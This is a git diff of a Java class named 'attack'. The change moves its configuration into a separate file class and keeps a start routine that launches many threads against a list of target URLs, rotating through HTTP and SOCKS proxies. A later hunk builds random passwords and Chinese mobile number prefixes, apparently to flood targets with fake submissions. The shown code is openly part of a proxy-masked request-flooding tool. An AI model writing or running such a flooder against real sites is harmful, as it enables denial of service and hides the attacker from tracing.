@@ -11,35 +11,28 @@ import java.net.URL;
 import java.util.Random;
 
 public class attack implements Runnable {
-    static String method;
-    static String[] urls;
-    static String param;
-    static boolean genoutput = false;
-    static boolean proxyswitch = false;
+    static String method = file.method;
+    static String[] urls = file.urls;
+    static String param = file.param;
+    static boolean genoutput = file.genoutput;
+    static boolean proxyswitch = file.proxyswitch;
     static String[] proxyhttp;
     static String[] proxysocks;
     static boolean proxyhttpswich = false;
     static boolean proxysocksswich = false;
-
-    protected static void feature(boolean tgenoutput, boolean tproxyswitch, String tproxyfile) {
-        genoutput = tgenoutput;
-        if (tproxyswitch) {
-            proxyhttp = murl.readhttp(tproxyfile);
+    
+    protected static void start() {
+        if (proxyswitch) {
+            proxyhttp = murl.readhttp(file.proxyfile);
             if (proxyhttp != null) {
                 proxyhttpswich = true;
             }
-            proxysocks = murl.readsocks(tproxyfile);
+            proxysocks = murl.readsocks(file.proxyfile);
             if (proxysocks != null) {
                 proxysocksswich = true;
             }
         }
-    }
-
-    protected static void start(int thnum, String tmethod, String[] turl, String tparam) {
-        method = tmethod;
-        urls = turl;
-        param = tparam;
-        for (int i = 0; i < thnum; i++) {
+        for (int i = 0; i < file.thnum; i++) {
             new Thread(new attack()).start();
         }
     }
@@ -49,7 +42,7 @@ public class attack implements Runnable {
         int max = 16;
         int min = 8;
 
-        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@";
+        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*";
         String[] bfnum = {
                 "134", "135", "136", "137", "138", "139", "150", "151", "152", "157", "158", "159", "182", "183", "184", // 中国移动
                 "187", "188", "178", "147", "172", "198", // 中国移动
